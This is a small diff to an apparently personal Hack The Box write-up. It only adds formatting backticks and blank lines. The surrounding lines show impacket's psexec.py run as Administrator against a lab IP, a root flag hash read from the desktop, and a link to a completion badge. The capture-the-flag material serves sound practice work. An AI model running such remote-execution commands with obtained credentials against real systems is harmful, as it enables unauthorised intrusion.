@@ -286,7 +286,7 @@ And now you have the admin password to login as admin...
 cp /usr/share/doc/python3-impacket/examples/psexec.py psexec.py
 ./psexec.py Administrator@10.129.95.187
 ```
-- Then just type the Admin flag...
+- Then just `type` the Admin flag...
 ```
 c:\Users\Administrator\Desktop> type root.txt
 b91ccec3305e98240082d4474b848528
@@ -295,3 +295,5 @@ b91ccec3305e98240082d4474b848528
 ![image](https://github.com/GregKedrovsky/Hacking/assets/26492233/7c01888c-8d01-4864-ae15-de076f55c471)
 
 [link to pwn cert](https://www.hackthebox.com/achievement/machine/172151/287)
+
+
